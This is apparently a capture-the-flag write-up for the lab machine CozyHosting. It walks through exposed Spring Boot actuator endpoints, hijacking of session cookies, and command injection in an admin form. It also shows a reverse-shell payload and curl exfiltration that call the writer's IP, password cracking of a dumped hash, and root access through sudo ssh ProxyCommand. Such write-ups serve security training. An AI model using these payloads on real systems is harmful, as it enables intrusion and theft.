# NMAP


```bash
Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-31 15:59 CET
Nmap scan report for 10.10.11.230
Host is up (0.12s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http
|_http-title: Did not follow redirect to http://cozyhosting.htb
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=12/31%OT=22%CT=1%CU=34701%PV=Y%DS=2%DC=I%G=Y%TM=659181
OS:EA%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10B%TI=Z%CI=Z%TS=A)SEQ(SP=
OS:103%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53AST11NW7%O2=M53AST11NW7%
OS:O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST11NW7%O6=M53AST11)WIN(W1=FE88%W2
OS:=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53ANNS
OS:NW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%
OS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%
OS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%
OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%
OS:RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.26 seconds

```

# USER


We need to change `/etc/hosts` adding cozyhosting.htb site mapping.

we're are prompted to a dashboard which have a login for administrators at `/login`

We don't have any information here. 

We can enumerate something with gobuster but we can get some useful information quicker using nuclei.

In fact running nuclei we obtain this:

```bash
[springboot-env] [http] [low] http://cozyhosting.htb/actuator/env
[springboot-beans] [http] [low] http://cozyhosting.htb/actuator/beans
[springboot-mappings] [http] [low] http://cozyhosting.htb/actuator/mappings
```

This says that there is spring boot actuator that is running.
Spring is the web framework for java web application, spring boot is a framework used to make default spring configurations easier and actuator is a dependency which is useful to monitoring the site stats, metrics and usages.

But, if not properly configured, it can lead to information disclosure like in this case
Surfing a litte let me found 2 intereting endpoints.

The first one leads to the discovery of the second one.

In fact, `/actuator/mappings` contains all http requests supported by the server.

```http
GET /actuator/mappings HTTP/1.1
Host: cozyhosting.htb
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=5EA58C165C82BF6B7F71D17BC420E3AF
Connection: close


```

```http

HTTP/1.1 200 
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 31 Dec 2023 15:20:26 GMT
Content-Type: application/vnd.spring-boot.actuator.v3+json
Connection: close
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY
Content-Length: 9938
{
    "contexts": {
        "application": {
            "mappings": {
                "dispatcherServlets": {
                    "dispatcherServlet": [
                        {
                            "handler": "Actuator web endpoint 'health'",
                            "predicate": "{GET [/actuator/health], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}",
                            "details": {
                                "handlerMethod": {
                                    "className": "org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler",
                                    "name": "handle",
                                    "descriptor": "(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"
                                },
                                "requestMappingConditions": {
                                    "consumes": [],
                                    "headers": [],
                                    "methods": [
                                        "GET"
                                    ],
                                    "params": [],
                                    "patterns": [
                                        "/actuator/health"
                                    ],
                                    "produces": [
                                        {
                                            "mediaType": "application/vnd.spring-boot.actuator.v3+json",
                                            "negated": false
                                        },
                                        {
                                            "mediaType": "application/vnd.spring-boot.actuator.v2+json",
                                            "negated": false
                                        },
                                        {
                                            "mediaType": "application/json",
                                            "negated": false
                                        }
                                    ]
                                }
                            }
                        },
                        {
                            "handler": "Actuator web endpoint 'sessions'",
                            "predicate": "{GET [/actuator/sessions], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}",
                            "details": {
                                "handlerMethod": {
                                    "className": "org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler",
                                    "name": "handle",
                                    "descriptor": "(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"
                                },
                                "requestMappingConditions": {
                                    "consumes": [],
                                    "headers": [],
                                    "methods": [
                                        "GET"
                                    ],
                                    "params": [],
                                    "patterns": [
                                        "/actuator/sessions"
                                    ],
                                    "produces": [
                                        {
                                            "mediaType": "application/vnd.spring-boot.actuator.v3+json",
                                            "negated": false
                                        },
                                        {
                                            "mediaType": "application/vnd.spring-boot.actuator.v2+json",
                                            "negated": false
                                        },
                                        {
                                            "mediaType": "application/json",
                                            "negated": false
                                        }
                                    ]
                                }
                            }
                        },
                        {
                            "handler": "Actuator web endpoint 'env-toMatch'",
                            "predicate": "{GET [/actuator/env/{toMatch}], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}",
                            "details": {
                                "handlerMethod": {
                                    "className": "org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler",
                                    "name": "handle",
                                    "descriptor": "(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"
                                },
                                "requestMappingConditions": {
                                    "consumes": [],
                                    "headers": [],
                                    "methods": [
                                        "GET"
                                    ],
                                    "params": [],
                                    "patterns": [
                                        "/actuator/env/{toMatch}"
                                    ],
                                    "produces": [
                                        {
                                            "mediaType": "application/vnd.spring-boot.actuator.v3+json",
                                            "negated": false
                                        },
                                        {
                                            "mediaType": "application/vnd.spring-boot.actuator.v2+json",
                                            "negated": false
                                        },
                                        {
                                            "mediaType": "application/json",
                                            "negated": false
                                        }
                                    ]
                                }
                            }
                        },
                        {
                            "handler": "Actuator web endpoint 'env'",
                            "predicate": "{GET [/actuator/env], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}",
                            "details": {
                                "handlerMethod": {
                                    "className": "org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler",
                                    "name": "handle",
                                    "descriptor": "(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"
                                },
                                "requestMappingConditions": {
                                    "consumes": [],
                                    "headers": [],
                                    "methods": [
                                        "GET"
                                    ],
                                    "params": [],
                                    "patterns": [
                                        "/actuator/env"
                                    ],
                                    "produces": [
                                        {
                                            "mediaType": "application/vnd.spring-boot.actuator.v3+json",
                                            "negated": false
                                        },
                                        {
                                            "mediaType": "application/vnd.spring-boot.actuator.v2+json",
                                            "negated": false
                                        },
                                        {
                                            "mediaType": "application/json",
                                            "negated": false
                                        }
                                    ]
                                }
                            }
                        },
                        {
                            "handler": "Actuator root web endpoint",
                            "predicate": "{GET [/actuator], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}",
                            "details": {
                                "handlerMethod": {
                                    "className": "org.springframework.boot.actuate.endpoint.web.servlet.WebMvcEndpointHandlerMapping.WebMvcLinksHandler",
                                    "name": "links",
                                    "descriptor": "(Ljakarta/servlet/http/HttpServletRequest;Ljakarta/servlet/http/HttpServletResponse;)Ljava/util/Map;"
                                },
                                "requestMappingConditions": {
                                    "consumes": [],
                                    "headers": [],
                                    "methods": [
                                        "GET"
                                    ],
                                    "params": [],
                                    "patterns": [
                                        "/actuator"
                                    ],
                                    "produces": [
                                        {
                                            "mediaType": "application/vnd.spring-boot.actuator.v3+json",
                                            "negated": false
                                        },
                                        {
                                            "mediaType": "application/vnd.spring-boot.actuator.v2+json",
                                            "negated": false
                                        },
                                        {
                                            "mediaType": "application/json",
                                            "negated": false
                                        }
                                    ]
                                }
                            }
                        },
                        {
                            "handler": "Actuator web endpoint 'health-path'",
                            "predicate": "{GET [/actuator/health/**], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}",
                            "details": {
                                "handlerMethod": {
                                    "className": "org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler",
                                    "name": "handle",
                                    "descriptor": "(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"
                                },
                                "requestMappingConditions": {
                                    "consumes": [],
                                    "headers": [],
                                    "methods": [
                                        "GET"
                                    ],
                                    "params": [],
                                    "patterns": [
                                        "/actuator/health/**"
                                    ],
                                    "produces": [
                                        {
                                            "mediaType": "application/vnd.spring-boot.actuator.v3+json",
                                            "negated": false
                                        },
                                        {
                                            "mediaType": "application/vnd.spring-boot.actuator.v2+json",
                                            "negated": false
                                        },
                                        {
                                            "mediaType": "application/json",
                                            "negated": false
                                        }
                                    ]
                                }
                            }
                        },
                        {
                            "handler": "Actuator web endpoint 'beans'",
                            "predicate": "{GET [/actuator/beans], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}",
                            "details": {
                                "handlerMethod": {
                                    "className": "org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler",
                                    "name": "handle",
                                    "descriptor": "(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"
                                },
                                "requestMappingConditions": {
                                    "consumes": [],
                                    "headers": [],
                                    "methods": [
                                        "GET"
                                    ],
                                    "params": [],
                                    "patterns": [
                                        "/actuator/beans"
                                    ],
                                    "produces": [
                                        {
                                            "mediaType": "application/vnd.spring-boot.actuator.v3+json",
                                            "negated": false
                                        },
                                        {
                                            "mediaType": "application/vnd.spring-boot.actuator.v2+json",
                                            "negated": false
                                        },
                                        {
                                            "mediaType": "application/json",
                                            "negated": false
                                        }
                                    ]
                                }
                            }
                        },
                        {
                            "handler": "Actuator web endpoint 'mappings'",
                            "predicate": "{GET [/actuator/mappings], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}",
                            "details": {
                                "handlerMethod": {
                                    "className": "org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler",
                                    "name": "handle",
                                    "descriptor": "(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"
                                },
                                "requestMappingConditions": {
                                    "consumes": [],
                                    "headers": [],
                                    "methods": [
                                        "GET"
                                    ],
                                    "params": [],
                                    "patterns": [
                                        "/actuator/mappings"
                                    ],
                                    "produces": [
                                        {
                                            "mediaType": "application/vnd.spring-boot.actuator.v3+json",
                                            "negated": false
                                        },
                                        {
                                            "mediaType": "application/vnd.spring-boot.actuator.v2+json",
                                            "negated": false
                                        },
                                        {
                                            "mediaType": "application/json",
                                            "negated": false
                                        }
                                    ]
                                }
                            }
                        },
                        {
                            "handler": "org.springframework.boot.autoconfigure.web.servlet.error.BasicErrorController#error(HttpServletRequest)",
                            "predicate": "{ [/error]}",
                            "details": {
                                "handlerMethod": {
                                    "className": "org.springframework.boot.autoconfigure.web.servlet.error.BasicErrorController",
                                    "name": "error",
                                    "descriptor": "(Ljakarta/servlet/http/HttpServletRequest;)Lorg/springframework/http/ResponseEntity;"
                                },
                                "requestMappingConditions": {
                                    "consumes": [],
                                    "headers": [],
                                    "methods": [],
                                    "params": [],
                                    "patterns": [
                                        "/error"
                                    ],
                                    "produces": []
                                }
                            }
                        },
                        {
                            "handler": "org.springframework.boot.autoconfigure.web.servlet.error.BasicErrorController#errorHtml(HttpServletRequest, HttpServletResponse)",
                            "predicate": "{ [/error], produces [text/html]}",
                            "details": {
                                "handlerMethod": {
                                    "className": "org.springframework.boot.autoconfigure.web.servlet.error.BasicErrorController",
                                    "name": "errorHtml",
                                    "descriptor": "(Ljakarta/servlet/http/HttpServletRequest;Ljakarta/servlet/http/HttpServletResponse;)Lorg/springframework/web/servlet/ModelAndView;"
                                },
                                "requestMappingConditions": {
                                    "consumes": [],
                                    "headers": [],
                                    "methods": [],
                                    "params": [],
                                    "patterns": [
                                        "/error"
                                    ],
                                    "produces": [
                                        {
                                            "mediaType": "text/html",
                                            "negated": false
                                        }
                                    ]
                                }
                            }
                        },
                        {
                            "handler": "htb.cloudhosting.compliance.ComplianceService#executeOverSsh(String, String, HttpServletResponse)",
                            "predicate": "{POST [/executessh]}",
                            "details": {
                                "handlerMethod": {
                                    "className": "htb.cloudhosting.compliance.ComplianceService",
                                    "name": "executeOverSsh",
                                    "descriptor": "(Ljava/lang/String;Ljava/lang/String;Ljakarta/servlet/http/HttpServletResponse;)V"
                                },
                                "requestMappingConditions": {
                                    "consumes": [],
                                    "headers": [],
                                    "methods": [
                                        "POST"
                                    ],
                                    "params": [],
                                    "patterns": [
                                        "/executessh"
                                    ],
                                    "produces": []
                                }
                            }
                        },
                        {
                            "handler": "ParameterizableViewController [view=\"admin\"]",
                            "predicate": "/admin"
                        },
                        {
                            "handler": "ParameterizableViewController [view=\"addhost\"]",
                            "predicate": "/addhost"
                        },
                        {
                            "handler": "ParameterizableViewController [view=\"index\"]",
                            "predicate": "/index"
                        },
                        {
                            "handler": "ParameterizableViewController [view=\"login\"]",
                            "predicate": "/login"
                        },
                        {
                            "handler": "ResourceHttpRequestHandler [classpath [META-INF/resources/webjars/]]",
                            "predicate": "/webjars/**"
                        },
                        {
                            "handler": "ResourceHttpRequestHandler [classpath [META-INF/resources/], classpath [resources/], classpath [static/], classpath [public/], ServletContext [/]]",
                            "predicate": "/**"
                        }
                    ]
                },
                "servletFilters": [
                    {
                        "servletNameMappings": [],
                        "urlPatternMappings": [
                            "/*"
                        ],
                        "name": "requestContextFilter",
                        "className": "org.springframework.boot.web.servlet.filter.OrderedRequestContextFilter"
                    },
                    {
                        "servletNameMappings": [],
                        "urlPatternMappings": [
                            "/*"
                        ],
                        "name": "Tomcat WebSocket (JSR356) Filter",
                        "className": "org.apache.tomcat.websocket.server.WsFilter"
                    },
                    {
                        "servletNameMappings": [],
                        "urlPatternMappings": [
                            "/*"
                        ],
                        "name": "serverHttpObservationFilter",
                        "className": "org.springframework.web.filter.ServerHttpObservationFilter"
                    },
                    {
                        "servletNameMappings": [],
                        "urlPatternMappings": [
                            "/*"
                        ],
                        "name": "characterEncodingFilter",
                        "className": "org.springframework.boot.web.servlet.filter.OrderedCharacterEncodingFilter"
                    },
                    {
                        "servletNameMappings": [],
                        "urlPatternMappings": [
                            "/*"
                        ],
                        "name": "springSecurityFilterChain",
                        "className": "org.springframework.boot.web.servlet.DelegatingFilterProxyRegistrationBean$1"
                    },
                    {
                        "servletNameMappings": [],
                        "urlPatternMappings": [
                            "/*"
                        ],
                        "name": "formContentFilter",
                        "className": "org.springframework.boot.web.servlet.filter.OrderedFormContentFilter"
                    }
                ],
                "servlets": [
                    {
                        "mappings": [
                            "/"
                        ],
                        "name": "dispatcherServlet",
                        "className": "org.springframework.web.servlet.DispatcherServlet"
                    }
                ]
            }
        }
    }
}
```


In the response there is an interesting `GET` request call called "sessions".

Giving a look at it with burpsuite returns some very juicy infos.

```http
GET /actuator/sessions HTTP/1.1
Host: cozyhosting.htb
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=5EA58C165C82BF6B7F71D17BC420E3AF
Connection: close


```


```
HTTP/1.1 200 
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 31 Dec 2023 15:25:53 GMT
Content-Type: application/vnd.spring-boot.actuator.v3+json
Connection: close
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY
Content-Length: 295

{
    "B4D77B4587F471323ED357DCAA604AB5": "kanderson",
    "472BC952BECF60DC11CFFFE97B4A9BE8": "kanderson",
    "ACBF140BB7102E36B39BCC433C359B0E": "UNAUTHORIZED",
    "4CD097EE2D438991C40D0F84407D550C": "UNAUTHORIZED",
    "5EA58C165C82BF6B7F71D17BC420E3AF": "UNAUTHORIZED",
    "6EEFEA57F8115E4C2F59C276912019BE": "UNAUTHORIZED"
}
```

The endpoint displays all active users sessions. The hash is the standard cookie hash used by spring for recognizing users server session.

Setting such valid session id for user kanderson on the site, like

```
Cookie: JSESSIONID=472BC952BECF60DC11CFFFE97B4A9BE8
```

Let us to login to admin panel.

The admin panel contains only a form with 2 inputs.
The form then performs a post request to an endpoint called `/addssh`
Such endpoint can be listed from `/actuator/mappings` previously discovered but without a session, is not accessible.

Parameters in the post request are only two: hostname and username.
We don't know what they are or what they do but the only thing that is sure is that:

- host can accept only a valid host format, such as 127.0.0.1
- username cannot conatins space, otherwise the application will reject the input.

Knowing these informations led me to try to inject username field with a `'` and unexpectatly I got an error in the header:

```
Location: http://cozyhosting.htb/admin?error=/bin/bash: -c: line 1: unexpected EOF while looking for matching `''/bin/bash: -c: line 2: syntax error: unexpected end of file
```

The error is printed because whatever the error is, a redirect like `?error=error+message` is uesd to print the error to the user.

The error talks clearly about a command injection.

The injection is confirmed by using the payload :


```http
POST /addhost HTTP/1.1
Host: cozyhosting.htb
Content-Length: 282
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://cozyhosting.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://cozyhosting.htb/admin?error=%27
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=BA2051A7562E66B27D7F609F6BB5D3A1
Connection: close

host=127.0.0.1&username=$(sleep${IFS}5)
```

which let's the request sleep for 5 seconds. We have to remember to use `Inline Field Separator` because white spaces are not admitted in username.

From here, I struggled a lot to obtain a reverse shell. Python payloads seemed not working for a lot of reasons that I understood only at the end, while with some payloads I was able to get a connection back on my netcat handler but no real reverse shell were spawned.

The particular I did not took care enough and led me to waste a lot of time was the following: we're inside a `/bin/bash -c` (as already seen from the error above), so we can't insert `'` otherwise we'll break the syntax.

The python reverse shell contains `'` which cannot be easily escaped, and even if i tried the right solution by base64 encoding payloads before, the payload for python reverse shell was too long and was rejected by the app for its length.

So, firstly, to obtain a rev-shell I played a little with the syntax and I was able to obtain some info using curl and its urlencoding.

```bash
;curl${IFS}--data-urlencode${IFS}"p=$(ls${IFS}-la|base64${IFS}-w0)"${IFS}http://10.10.16.12:1234;
```

With this, I was able to obtain the exact sh location instead of calling sh directly:

```
/usr/bin/sh
```

After hours I got the right payload which was:


```bash
sh -i >& /dev/tcp/10.10.16.12/1234 0>&1
```

Here, I tried some injection but the only working one inside the `bash -c` syntax, was the following


```bash
;echo${IFS}"c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMTIvMTIzNCAwPiYx"|base64${IFS}-d|bash;
```

Which needed the `;` at the end and the call of `bash` instead of `sh`. Without these cautions the shell doesn't spawn because the syntax is wrong or bad interpreted.

Don't ask me why the base64 ecnoded part contains sh while in order to obtain a shell you must use bash and not sh.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl+z
stty raw -echo
fg
```

Doing a pwd we're in `/app` and a `whoami` gives `app`.

There is  a file called `cloudhosting-0.0.1.jar` in `/app`

In users there is a directory (so probably a user), called josh.

Let's try to obtain some interesting files containing the string josh

```bash
find / -iname '*.*' -exec grep -i josh {} \; -print 2> /dev/null
```

nothing.

`lse.sh` is not yet useful so we have to analyze that jar file in order to proceed (most probably)


```bash
receive file: nc -l -p 12344 > cloudhosting-0.0.1.jar
send file: nc 10.10.16.12 12344 < cloudhosting-0.0.1.jar 
```

Insteresting information found on reverse enginereed `jar` using `jd-gui` which is a famous decompiler for java. The jar contains an interesting configuration file read by the application and embedded in `.jar` bytecode:

`application.properties`

```text
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

We've credentials for postgres, and doing a `ps aux` confirms the presence of postgre running.

```bash
psql -h 127.0.0.1 -U postgres -d cozyhosting

Password: Vg&nvzAQ7XxR
```


```bash
cozyhosting=# \dt
WARNING: terminal is not fully functional
Press RETURN to continue 
         List of relations
 Schema | Name  | Type  |  Owner   
--------+-------+-------+----------
 public | hosts | table | postgres
 public | users | table | postgres
(2 rows)

cozyhosting=# select * from public.users;
WARNING: terminal is not fully functional
Press RETURN to continue 
   name    |                           password                           | role
  
-----------+--------------------------------------------------------------+-----
--
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admi
n
(2 rows)
```

Let's attempt to crack that admin password, we don't care about kanderson, we already know too much about him.

```
hashcat -a 0 -m 3200 '$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm' ~/SecLists/rockyou.txt

$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited
```

The password can be used for ssh'd in josh or do a `su josh` and to obtain user flag. 


# ROOT

Root is quite simple,

running `sudo -l`and giving the user password, (or running `lse.sh`) returns the following:

```bash
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

So ssh can run whatveer arguments we want using sudo permissions.

Here i learnt that there is a site useful `https://gtfobins.github.io/`

which can be used for well known binaries to search info for privilage escalation

In partiulcar `https://gtfobins.github.io/gtfobins/ssh/`

says that shell can be spwaned using `ProxyCommand` Option and since the ssh can be run as root maybe it maintains its privileges.

It worked with

```bash
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

